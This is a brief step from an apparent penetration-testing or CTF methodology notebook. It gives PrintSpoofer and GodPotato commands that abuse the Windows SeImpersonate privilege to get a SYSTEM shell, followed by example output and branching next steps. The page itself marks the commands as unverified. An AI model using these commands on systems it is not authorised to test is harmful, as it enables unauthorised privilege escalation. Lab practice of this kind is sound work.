# Windows - SeImpersonate Abuse

**Step 29 of 50 · Windows**

*Use an enabled impersonation privilege to attempt a SYSTEM shell.*

## Run this

```powershell
PrintSpoofer.exe -i -c powershell.exe
GodPotato.exe -cmd "whoami"
```

## Example output

 > *Example shape only: these exact tool invocations are not yet verified against a real box.*
```
[+] Attempting token impersonation
C:\> whoami
nt authority\system
```
## What did you get?

- [ ] SYSTEM shell is returned → **Confirm identity, then go to Step 33 · [[Windows - Clean Down]]**
- [ ] The tool fails on this OS → **Check the Windows build and return to Step 28 · [[Windows - Privilege Triage]]**
- [ ] The privilege is absent → **Go to Step 30 · [[Windows - Service Abuse]]**

## Notes

These exact tool invocations are not directly demonstrated in the MarkUp write-up or the Forest and Sauna write-ups.

## Gotcha

> [!warning] 💡
> The command and binary choice are not yet verified against the current vault box transcripts. Confirm before relying on this page.
